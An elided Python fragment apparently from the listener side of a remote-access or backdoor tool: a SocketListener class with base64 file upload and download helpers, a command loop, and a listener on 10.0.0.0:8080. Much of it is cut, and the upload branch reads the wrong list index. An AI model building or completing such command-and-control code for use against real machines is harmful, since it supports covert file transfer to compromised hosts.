...
class SocketListener:
    ...
    def get_file_contents(self,path):
        with open(path,"rb") as my_fileee:
            return base64.b64encode(my_fileee.read())
    def save_file(self,path,content):
        with open(path,"wb") as my_fileee:
            my_fileee.write(base64.b64decode(content))
            return "dwn ok"
        ...
        while True:
            ...
            try:
                if command_input[0]=="upload":
                    my_file_content=self.get_file_contents(command_input[0])
...
my_socket_listener=SocketListener("10.0.0.0",8080)
